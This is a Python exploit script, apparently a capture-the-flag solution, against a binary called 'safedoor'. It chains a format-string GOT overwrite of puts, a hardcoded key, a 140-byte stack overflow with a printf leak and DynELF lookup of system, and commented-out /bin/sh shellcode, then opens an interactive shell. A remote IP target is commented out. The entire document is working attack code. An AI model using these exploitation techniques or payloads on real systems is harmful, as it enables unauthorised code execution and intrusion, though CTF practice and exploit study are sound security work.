from pwn import *
from zio import *
p = process('./safedoor')
context(log_level='debug')

io = zio('./safedoor')
# p = remote('219.146.15.117',8000)
elf = ELF('safedoor')
puts_got = elf.got['puts']
mprotect_plt = elf.symbols['mprotect']
gets_plt = elf.symbols['gets']
puts_plt = elf.symbols['puts']
printf_plt = elf.symbols['printf']

bss_addr = elf.bss(0)
ppp_ret = 0x080486cd
p_ret = 0x080483e1
call_eax = 0x80484f6

# p.recvuntil('KEY:')
io.read_until('KEY:')
m_p = 0x0804858D

# gdb.attach(p,'b* 0x080485BD\nc')
# for x in range(2):
# 	l = (m_p >> (x*8)) &0xff
# 	payload = p32(puts_got+x)+"%%%dc"%(l-4)+"%4$hhn..."
# 	p.sendline(payload)
# 	p.recvuntil('...')
# l = (m_p >> (2*8)) &0xff
# payload = p32(puts_got+2)+"%4$hhn..."
# p.sendline(payload)
# p.recvuntil('...')

for x in range(2):
	l = (m_p >> (x*8)) &0xff
	payload = p32(puts_got+x)+"%%%dc"%(l-4)+"%4$hhn..."
	io.writeline(payload)
	io.read_until('...')

l = (m_p >> (2*8)) &0xff
payload = p32(puts_got+2)+"%%%dc"%(l-4)+"%4$hhn..."
io.writeline(payload)
io.read_until('...')


l = (m_p >> (3*8)) &0xff
payload = p32(puts_got+3)+"%%%dc"%(l-4)+"%4$hhn..."
io.writeline(payload)
io.read_until('...')


io.writeline('STjJaOEwLszsLwRy')
io.read_until('\nKEY:')

# p.sendline('STjJaOEwLszsLwRy')
# p.recvuntil('\nKEY:')
#put shellcode
# buf =  "\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
# shellcode = buf+(0x88+4-len(buf))*'A'
def leak(addr):
	payload1 = 'A'*140+p32(printf_plt)+p32(p_ret)+p32(addr)+p32(puts_plt)
	# +p32(p_ret)+p32(bss_addr)+p32(bss_addr)
	io.writeline(payload1)
	data =io.read(4)
	
	# print data
	# print 1
	return data
d = DynELF('./safedoor', leak) 
system = d.lookup('system') 
# payload1 = 'A'*140+p32(printf_plt)+p32(p_ret)+p32(puts_got)+p32(puts_plt)
# p.sendline(payload1)
# print p.recvline()
# payload2 = 'A'*140+p32(printf_plt)+p32(p_ret)+p32(bss_addr)+p32(puts_plt)
# p.sendline(payload2)
# shellcode =  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
# p.sendline(shellcode)
# p.interactive()
io.inter()